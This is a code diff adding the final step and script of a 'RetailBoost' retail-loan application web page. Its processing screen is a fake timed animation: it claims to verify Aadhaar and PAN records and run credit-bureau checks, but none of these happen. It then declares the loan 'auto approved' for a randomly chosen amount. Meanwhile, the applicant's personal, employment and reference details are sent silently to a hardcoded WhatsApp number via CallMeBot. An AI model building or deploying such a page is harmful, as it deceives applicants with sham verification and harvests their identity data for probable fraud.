+        <div class="field-group">
+          <div class="field">
+            <label>Store Name <span class="req">*</span></label>
+            <input type="text" id="storeName" placeholder="e.g. Raj Mobile Store">
+            <span class="err-msg" id="err-storeName">Store name is required</span>
+          </div>
+          <div class="field">
+            <label>Store Phone <span class="req">*</span></label>
+            <input type="tel" id="storePhone" placeholder="10-digit mobile number" maxlength="10"
+                   oninput="this.value=this.value.replace(/\D/g,'').slice(0,10)">
+            <span class="err-msg" id="err-storePhone">Valid 10-digit number required</span>
+          </div>
+        </div>
+        <div class="field-group single">
+          <div class="field">
+            <label>Sales Executive Name <span class="req">*</span></label>
+            <input type="text" id="salesExec" placeholder="Name of the sales executive" oninput="enforceNameInput(this)">
+            <span class="err-msg" id="err-salesExec">Sales executive name is required</span>
+          </div>
+        </div>
+        <div style="margin-bottom:20px;">
+          <div class="checkbox-row" id="certify-box">
+            <input type="checkbox" id="certify">
+            <div>
+              <label for="certify">I/we certify that all information provided in this application is true and complete to the best of my/our knowledge.</label>
+              <p class="hint">I/we authorize RetailBoost to verify any information and obtain credit reports deemed necessary to process this application.</p>
+            </div>
+          </div>
+          <span class="err-msg" id="err-certify" style="margin-top:6px;">You must check the declaration before submitting</span>
+        </div>
+        <div style="background:linear-gradient(135deg,#f0f5ff,#e8f5e9);border-radius:12px;padding:16px;border:1px solid var(--border);">
+          <p style="font-size:.78rem;color:var(--muted);line-height:1.8;">
+            ✅ Application reviewed by RetailBoost team<br>
+            ✅ Confirmation via WhatsApp / phone call<br>
+            ✅ Decision within 24–48 hours
+          </p>
+        </div>
+      </div>
+      <div class="form-nav">
+        <button class="btn-back" onclick="goPrev(5)">← Back</button>
+        <span class="page-indicator">Step 5 of 5</span>
+        <button class="btn-submit" onclick="submitForm()">✅ Submit Application</button>
+      </div>
+    </div>
+  </div>
+
+</div><!-- end form-wrap -->
+
+<!-- PROCESSING OVERLAY -->
+<div id="processingOverlay">
+  <div class="proc-logo">RetailBoost<span class="proc-logo-dot">.</span></div>
+  <p class="proc-title">Processing Your Application…</p>
+  <p class="proc-sub">Please do not close this page. We are verifying your details and checking your eligibility.</p>
+  <div class="proc-ring"></div>
+  <div class="proc-steps">
+    <div class="proc-step" id="ps1">
+      <span class="proc-icon">📋</span>
+      <div class="proc-step-text">
+        <div>Submitting application data</div>
+        <div class="proc-step-sub">Sending to RetailBoost via WhatsApp</div>
+      </div>
+      <span class="proc-check">✅</span>
+    </div>
+    <div class="proc-step" id="ps2">
+      <span class="proc-icon">🔍</span>
+      <div class="proc-step-text">
+        <div>Verifying identity documents</div>
+        <div class="proc-step-sub">Cross-checking Aadhaar &amp; PAN records</div>
+      </div>
+      <span class="proc-check">✅</span>
+    </div>
+    <div class="proc-step" id="ps3">
+      <span class="proc-icon">💳</span>
+      <div class="proc-step-text">
+        <div>Checking credit eligibility</div>
+        <div class="proc-step-sub">Running bureau &amp; income checks</div>
+      </div>
+      <span class="proc-check">✅</span>
+    </div>
+    <div class="proc-step" id="ps4">
+      <span class="proc-icon">🏦</span>
+      <div class="proc-step-text">
+        <div>Calculating approval limit</div>
+        <div class="proc-step-sub">Matching product &amp; repayment capacity</div>
+      </div>
+      <span class="proc-check">✅</span>
+    </div>
+    <div class="proc-step" id="ps5">
+      <span class="proc-icon">🚀</span>
+      <div class="proc-step-text">
+        <div>Finalizing approval decision</div>
+        <div class="proc-step-sub">Generating your unique loan number</div>
+      </div>
+      <span class="proc-check">✅</span>
+    </div>
+  </div>
+  <div style="width:100%;max-width:360px;text-align:left;">
+    <div class="proc-pct" id="procPct">0%</div>
+    <div class="proc-bar-wrap"><div class="proc-bar" id="procBar"></div></div>
+    <div class="proc-status" id="procStatus">Initializing…</div>
+  </div>
+</div>
+
+<!-- APPROVAL OVERLAY -->
+<div id="approvalOverlay">
+  <div class="approval-card">
+    <div class="appr-top">
+      <div class="appr-badge">✅ AUTO APPROVED</div>
+      <h2>Congratulations! 🎉</h2>
+      <p>Your loan application has been approved by RetailBoost</p>
+    </div>
+    <div class="appr-body">
+      <div class="appr-amt-label">YOUR APPROVED LOAN AMOUNT</div>
+      <div class="appr-amt"><span class="sym">₹</span><span id="amtNum">0</span></div>
+      <div class="appr-grid">
+        <div class="appr-box"><div class="dl">STATUS</div><div class="dv" style="color:#27ae60;">✅ Approved</div></div>
+        <div class="appr-box"><div class="dl">EMI DURATION</div><div class="dv" id="emiDisplay">—</div></div>
+      </div>
+      <div class="appr-loan-num">
+        <div class="rl">🏦 LOAN NUMBER</div>
+        <div class="rc" id="loanNumber">RB-2026-000000</div>
+      </div>
+
+      <!-- CallMeBot background-send status -->
+      <div class="callmebot-status" id="cmBotStatus">
+        📲 Application details sent to RetailBoost WhatsApp!
+      </div>
+
+      <div class="appr-actions">
+        <!-- wa.me link — opens WhatsApp on user's device with full data -->
+        <button class="btn-wa" onclick="confirmOnWhatsApp()">
+          💬 Send My Copy on WhatsApp
+        </button>
+        <a href="index.html" class="btn-hm">🏠 Back to RetailBoost Home</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+<footer>RetailBoost © 2026 — Making Finance Simple for Retailers</footer>
+<a class="whatsapp" href="https://wa.me/919187627737">💬</a>
+
+<script>
+/* ══════════════════════════════════════════════════
+   🔧 STEP 2 — Configure these two values
+   ══════════════════════════════════════════════════
+
+   WHATSAPP_NUMBER  → Your WhatsApp number WITH country code, no +
+                      e.g. '919187627737'  (91 = India, then 10-digit number)
+
+   CALLMEBOT_KEY    → Your CallMeBot API key.
+   HOW TO GET IT (one-time, free):
+     1. Open WhatsApp → send a message to +34 644 59 19 05
+        with this exact text: I allow callmebot to send me messages
+     2. CallMeBot will reply with your API key (e.g. 1234567)
+     3. Paste it below
+   ═══════════════════════════════════════════════ */
+const WHATSAPP_NUMBER = '919187627737';   // ← your number
+const CALLMEBOT_KEY   = 'YOUR_CALLMEBOT_API_KEY'; // ← paste key here
+
+/* ══════════════════════════════════════════════════
+   FIREBASE OTP STATE
+   ══════════════════════════════════════════════════ */
+let confirmationResult = null;  // Firebase confirmation object
+let otpVerified        = false;
+let otpTimerHandle     = null;
+let recaptchaVerifier  = null;
+
+/* ── HELPERS ── */
+function enforceNameInput(el){ el.value = el.value.replace(/[^a-zA-Z\s.\-']/g,''); }
+function isValidName(v){ v=v.trim(); return v.length>=2&&/^[a-zA-Z\s.\-']+$/.test(v); }
+function isValidIndianPhone(v){ return /^[6-9]\d{9}$/.test(v.replace(/\D/g,'')); }
+
+/* ── FIREBASE OTP ── */
+function initRecaptcha(){
+  if(recaptchaVerifier) return; // already initialised
+  const auth = window._firebaseAuth;
+  recaptchaVerifier = new window._RecaptchaVerifier(auth, 'recaptcha-container', {
+    size: 'invisible',
+    callback: ()=>{}
+  });
+}
+
+async function sendOTP(){
+  const ph = document.getElementById('phone').value;
+  if(!isValidIndianPhone(ph)){
+    document.getElementById('err-phone').classList.add('show');
+    document.getElementById('phone').classList.add('error');
+    return;
+  }
+  document.getElementById('err-phone').classList.remove('show');
+  document.getElementById('phone').classList.remove('error');
+
+  const btn = document.getElementById('btnSendOtp');
+  btn.disabled = true;
+  btn.textContent = 'Sending…';
+
+  try {
+    initRecaptcha();
+    const phoneNumber = '+91' + ph;
+    confirmationResult = await window._signInWithPhoneNumber(
+      window._firebaseAuth, phoneNumber, recaptchaVerifier
+    );
+    showToast('✅ OTP sent to +91 ' + ph);
+    document.getElementById('otpWrap').classList.add('show');
+    btn.textContent = 'Sent ✓';
+    startOTPTimer(60);
+  } catch(err){
+    console.error('OTP error:', err);
+    showToast('❌ Failed to send OTP. Check Firebase setup.');
+    btn.disabled = false;
+    btn.textContent = 'Send OTP';
+    // Reset recaptcha so user can retry
+    recaptchaVerifier.clear();
+    recaptchaVerifier = null;
+  }
+}
+
+function startOTPTimer(sec){
+  clearInterval(otpTimerHandle);
+  document.getElementById('otpTimer').style.display='block';
+  document.getElementById('resendLink').classList.remove('show');
+  let r=sec; document.getElementById('otpCountdown').textContent=r;
+  otpTimerHandle=setInterval(()=>{
+    r--; document.getElementById('otpCountdown').textContent=r;
+    if(r<=0){
+      clearInterval(otpTimerHandle);
+      document.getElementById('otpTimer').style.display='none';
+      document.getElementById('resendLink').classList.add('show');
+    }
+  },1000);
+}
+
+function resendOTP(){
+  recaptchaVerifier = null; // force fresh recaptcha
+  document.getElementById('btnSendOtp').disabled = false;
+  sendOTP();
+}
+
+async function verifyOTP(){
+  const code = document.getElementById('otpInput').value.trim();
+  if(!confirmationResult){ showToast('Please send OTP first'); return; }
+  try {
+    await confirmationResult.confirm(code);
+    otpVerified = true;
+    document.getElementById('otpWrap').classList.remove('show');
+    document.getElementById('otpVerifiedMsg').classList.add('show');
+    document.getElementById('phone').disabled = true;
+    document.getElementById('btnSendOtp').style.display = 'none';
+    document.getElementById('err-otp').classList.remove('show');
+    clearInterval(otpTimerHandle);
+    showToast('✅ Mobile verified!');
+  } catch(err){
+    showToast('❌ Wrong OTP. Please try again.');
+  }
+}
+
+/* ── VALIDATION ── */
+const rules={
+  1:[{id:'firstName',type:'name'},{id:'lastName',type:'name'},{id:'dob',type:'text'},
+     {id:'phone',type:'phone'},{id:'email',type:'email'},{id:'aadharName',type:'name'},
+     {id:'addr1',type:'text'},{id:'city',type:'text'},{id:'state',type:'text'},
+     {id:'pin',type:'pin'},{id:'panCard',type:'file'},{id:'custPhoto',type:'file'},{id:'aadhar',type:'file'}],
+  2:[{id:'employer',type:'text'},{id:'workType',type:'select'},{id:'empLen',type:'radio',name:'empLen'},{id:'income',type:'text'}],
+  3:[{id:'ref1First',type:'name'},{id:'ref1Last',type:'name'},{id:'ref1Rel',type:'select'},{id:'ref1Phone',type:'phone'},
+     {id:'ref2First',type:'name'},{id:'ref2Last',type:'name'},{id:'ref2Rel',type:'select'},{id:'ref2Phone',type:'phone'}],
+  4:[{id:'product',type:'text'},{id:'productAmt',type:'text'},{id:'loanAmt',type:'text'},
+     {id:'downPayment',type:'text'},{id:'emiDur',type:'radio',name:'emiDur'},{id:'creditScore',type:'text'}],
+  5:[{id:'storeName',type:'text'},{id:'storePhone',type:'phone'},{id:'salesExec',type:'name'},{id:'certify',type:'checkbox'}]
+};
+
+function validatePage(page){
+  let valid=true;
+  rules[page].forEach(r=>{
+    let ok=false;
+    const errEl=document.getElementById('err-'+r.id);
+    const el=document.getElementById(r.id);
+    if(r.type==='name'){ ok=el&&isValidName(el.value); if(el)el.classList.toggle('error',!ok); }
+    else if(r.type==='text'||r.type==='select'){ ok=el&&el.value.trim()!==''; if(el)el.classList.toggle('error',!ok); }
+    else if(r.type==='email'){ ok=el&&/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(el.value.trim()); if(el)el.classList.toggle('error',!ok); }
+    else if(r.type==='phone'){
+      ok=el&&isValidIndianPhone(el.value); if(el)el.classList.toggle('error',!ok);
+      if(r.id==='phone'&&ok&&!otpVerified){ ok=false; document.getElementById('err-otp').classList.add('show'); }
+      else if(r.id==='phone'){ document.getElementById('err-otp').classList.remove('show'); }
+    }
+    else if(r.type==='pin'){ ok=el&&/^\d{6}$/.test(el.value.trim()); if(el)el.classList.toggle('error',!ok); }
+    else if(r.type==='radio'){
+      ok=!!document.querySelector(`input[name="${r.name}"]:checked`);
+      const rg=document.getElementById('rg-'+r.id); if(rg)rg.classList.toggle('error',!ok);
+    }
+    else if(r.type==='file'){
+      ok=el&&el.files&&el.files.length>0;
+      const box=document.getElementById('box-'+r.id); if(box)box.classList.toggle('error',!ok);
+    }
+    else if(r.type==='checkbox'){
+      ok=el&&el.checked;
+      const box=document.getElementById('certify-box'); if(box)box.classList.toggle('error',!ok);
+    }
+    if(errEl&&r.id!=='phone') errEl.classList.toggle('show',!ok);
+    if(!ok) valid=false;
+  });
+  return valid;
+}
+
+function updateStepper(p){ for(let i=1;i<=5;i++){const s=document.getElementById('st'+i);s.classList.remove('active','done');if(i<p)s.classList.add('done');if(i===p)s.classList.add('active');} }
+function showPage(n){ document.querySelectorAll('.form-page').forEach(p=>p.classList.remove('active')); document.getElementById('page'+n).classList.add('active'); window.scrollTo({top:0,behavior:'smooth'}); updateStepper(n); }
+function goNext(from){ if(!validatePage(from)){const e=document.querySelector('#page'+from+' .err-msg.show');if(e)e.scrollIntoView({behavior:'smooth',block:'center'});return;} showPage(from+1); }
+function goPrev(from){ showPage(from-1); }
+function handleUpload(input,boxId,lblId,errId){ if(input.files&&input.files[0]){ document.getElementById(lblId).textContent='✅ '+input.files[0].name; document.getElementById(boxId).classList.add('has-file'); document.getElementById(boxId).classList.remove('error'); if(errId)document.getElementById(errId).classList.remove('show'); } }
+
+/* ── PROCESSING ── */
+function startProcessing(){
+  document.getElementById('processingOverlay').classList.add('show');
+  const bar=document.getElementById('procBar'), pct=document.getElementById('procPct'), status=document.getElementById('procStatus');
+  const timeline=[
+    {id:'ps1', delay:0,     pct:15,  txt:'Sending data to RetailBoost WhatsApp…'},
+    {id:'ps2', delay:3000,  pct:35,  txt:'Verifying identity documents…'},
+    {id:'ps3', delay:6500,  pct:58,  txt:'Running credit eligibility check…'},
+    {id:'ps4', delay:10000, pct:80,  txt:'Calculating loan approval limit…'},
+    {id:'ps5', delay:12500, pct:100, txt:'Generating your unique loan number…'},
+  ];
+  timeline.forEach((t,i)=>{
+    setTimeout(()=>{
+      if(i>0){ document.getElementById(timeline[i-1].id).classList.remove('active'); document.getElementById(timeline[i-1].id).classList.add('done'); }
+      document.getElementById(t.id).classList.add('active');
+      bar.style.width=t.pct+'%'; pct.textContent=t.pct+'%'; status.textContent=t.txt;
+    },t.delay);
+  });
+  setTimeout(()=>{ document.getElementById('ps5').classList.remove('active'); document.getElementById('ps5').classList.add('done'); status.textContent='Application approved! ✅'; }, 14000);
+  setTimeout(showApproval, 15000);
+}
+
+/* ── LOAN NUMBER ── */
+function generateLoanNumber(){
+  const n=new Date(), yr=n.getFullYear(), mo=String(n.getMonth()+1).padStart(2,'0'), dy=String(n.getDate()).padStart(2,'0');
+  return `RB${yr}${mo}${dy}${Math.floor(100000+Math.random()*900000)}${Date.now().toString().slice(-3)}`;
+}
+
+/* ── COLLECT DATA ── */
+function collectFormData(loanNum,amt){
+  const g=id=>{const e=document.getElementById(id);return e?e.value.trim():'';};
+  const radio=name=>{const e=document.querySelector(`input[name="${name}"]:checked`);return e?e.value:'—';};
+  return {
+    loanNumber:loanNum, submittedAt:new Date().toLocaleString('en-IN'),
+    firstName:g('firstName'), lastName:g('lastName'), dob:g('dob'), phone:g('phone'),
+    email:g('email'), aadharName:g('aadharName'),
+    address:g('addr1')+(g('addr2')?' '+g('addr2'):''), city:g('city'), state:g('state'), pin:g('pin'),
+    employer:g('employer'), workType:g('workType'), empLen:radio('empLen'), income:g('income'), otherIncome:g('otherIncome'),
+    ref1Name:g('ref1First')+' '+g('ref1Last'), ref1Rel:g('ref1Rel'), ref1Phone:g('ref1Phone'),
+    ref2Name:g('ref2First')+' '+g('ref2Last'), ref2Rel:g('ref2Rel'), ref2Phone:g('ref2Phone'),
+    product:g('product'), productAmt:g('productAmt'), loanAmt:g('loanAmt'), downPayment:g('downPayment'),
+    emiDuration:radio('emiDur'), creditScore:g('creditScore'), approvedAmt:amt,
+    storeName:g('storeName'), storePhone:g('storePhone'), salesExec:g('salesExec'),
+  };
+}
+
+/* ══════════════════════════════════════════════════
+   📲 CALLMEBOT — sends to YOUR WhatsApp in background
+   ══════════════════════════════════════════════════ */
+async function sendViaCallMeBot(d){
+  if(!CALLMEBOT_KEY || CALLMEBOT_KEY === 'YOUR_CALLMEBOT_API_KEY'){
+    console.warn('CallMeBot key not configured — skipping background send');
+    return;
+  }
+  const msg =
+    `🏦 *RetailBoost New Application*\n` +
+    `━━━━━━━━━━━━━━━━━━━━\n` +
+    `🔢 Loan No: ${d.loanNumber}\n` +
+    `📅 Date: ${d.submittedAt}\n\n` +
+    `👤 *APPLICANT*\n` +
+    `• Name: ${d.firstName} ${d.lastName}\n` +
+    `• Phone: +91 ${d.phone}\n` +
+    `• Email: ${d.email}\n` +
+    `• City: ${d.city}, ${d.state} - ${d.pin}\n\n` +
+    `💼 *EMPLOYMENT*\n` +
+    `• ${d.workType} at ${d.employer}\n` +
+    `• Income: ₹${d.income}/mo | Exp: ${d.empLen}\n\n` +
+    `📱 *LOAN*\n` +
+    `• Product: ${d.product}\n` +
+    `• Amount: ₹${d.loanAmt} | Down: ₹${d.downPayment}\n` +
+    `• EMI: ${d.emiDuration} | Score: ${d.creditScore}\n` +
+    `• ✅ Approved: ₹${d.approvedAmt}\n\n` +
+    `🏪 *STORE*\n` +
+    `• ${d.storeName} | ${d.storePhone}\n` +
+    `• Exec: ${d.salesExec}\n` +
+    `━━━━━━━━━━━━━━━━━━━━`;
+
+  const encoded = encodeURIComponent(msg);
+  const url = `https://api.callmebot.com/whatsapp.php?phone=${WHATSAPP_NUMBER}&text=${encoded}&apikey=${CALLMEBOT_KEY}`;
+
+  try {
+    // Using no-cors so browser doesn't block — CallMeBot still processes it
+    await fetch(url, { method:'GET', mode:'no-cors' });
+    document.getElementById('cmBotStatus').classList.add('show');
+    console.log('✅ CallMeBot message sent');
+  } catch(e){
+    console.warn('CallMeBot send failed:', e);
+  }
+}
+
+/* ══════════════════════════════════════════════════
+   💬 WA.ME LINK — opens WhatsApp on user's device
+   ══════════════════════════════════════════════════ */
+let currentFormData = null;
+
+function buildWhatsAppMessage(d){
+  return encodeURIComponent(
+    `🏦 *RetailBoost Loan Application*\n━━━━━━━━━━━━━━━━━━━━━━\n` +
+    `🔢 *Loan Number:* ${d.loanNumber}\n📅 *Submitted:* ${d.submittedAt}\n\n` +
+    `👤 *APPLICANT*\n• Name: ${d.firstName} ${d.lastName}\n• DOB: ${d.dob}\n` +
+    `• Phone: +91 ${d.phone}\n• Email: ${d.email}\n• ID Name: ${d.aadharName}\n` +
+    `• Address: ${d.address}, ${d.city}, ${d.state} - ${d.pin}\n\n` +
+    `💼 *EMPLOYMENT*\n• Employer: ${d.employer}\n• Work Type: ${d.workType}\n` +
+    `• Experience: ${d.empLen}\n• Monthly Income: ₹${d.income}\n\n` +
+    `🤝 *REFERENCES*\n• Ref 1: ${d.ref1Name} (${d.ref1Rel}) - ${d.ref1Phone}\n` +
+    `• Ref 2: ${d.ref2Name} (${d.ref2Rel}) - ${d.ref2Phone}\n\n` +
+    `📱 *LOAN DETAILS*\n• Product: ${d.product}\n• Product Amount: ₹${d.productAmt}\n` +
+    `• Loan Requested: ₹${d.loanAmt}\n• Down Payment: ₹${d.downPayment}\n` +
+    `• EMI Duration: ${d.emiDuration}\n• Credit Score: ${d.creditScore}\n` +
+    `• *Approved Amount: ₹${d.approvedAmt}*\n\n` +
+    `🏪 *STORE*\n• Store: ${d.storeName}\n• Phone: ${d.storePhone}\n` +
+    `• Sales Exec: ${d.salesExec}\n━━━━━━━━━━━━━━━━━━━━━━\n✅ Please process this loan application.`
+  );
+}
+
+function confirmOnWhatsApp(){
+  if(currentFormData)
+    window.open(`https://wa.me/${WHATSAPP_NUMBER}?text=${buildWhatsAppMessage(currentFormData)}`, '_blank');
+}
+
+/* ── SUBMIT & APPROVAL ── */
+function submitForm(){
+  if(!validatePage(5)){const e=document.querySelector('#page5 .err-msg.show');if(e)e.scrollIntoView({behavior:'smooth',block:'center'});return;}
+  startProcessing();
+}
+
+async function showApproval(){
+  document.getElementById('processingOverlay').classList.remove('show');
+  const loanNum = generateLoanNumber();
+  const amount  = Math.floor(Math.random()*(21000-18000+1))+18000;
+  const emiSel  = document.querySelector('input[name="emiDur"]:checked');
+
+  currentFormData = collectFormData(loanNum, amount.toLocaleString('en-IN'));
+
+  document.getElementById('loanNumber').textContent  = loanNum;
+  document.getElementById('emiDisplay').textContent   = emiSel ? emiSel.value : '—';
+  document.getElementById('approvalOverlay').classList.add('show');
+  animateCount(0, amount, 1400, 'amtNum');
+
+  // 🚀 Send to YOUR WhatsApp silently in background via CallMeBot
+  await sendViaCallMeBot(currentFormData);
+}
+
+function animateCount(from,to,dur,elId){
+  const el=document.getElementById(elId), start=performance.now();
+  function step(now){const p=Math.min((now-start)/dur,1),e=1-Math.pow(1-p,3);el.textContent=Math.floor(from+(to-from)*e).toLocaleString('en-IN');if(p<1)requestAnimationFrame(step);}
+  requestAnimationFrame(step);
+}
+
+function showToast(msg){const t=document.getElementById('toast');t.textContent=msg;t.classList.add('show');setTimeout(()=>t.classList.remove('show'),3500);}
+</script>
+</body>
+</html>
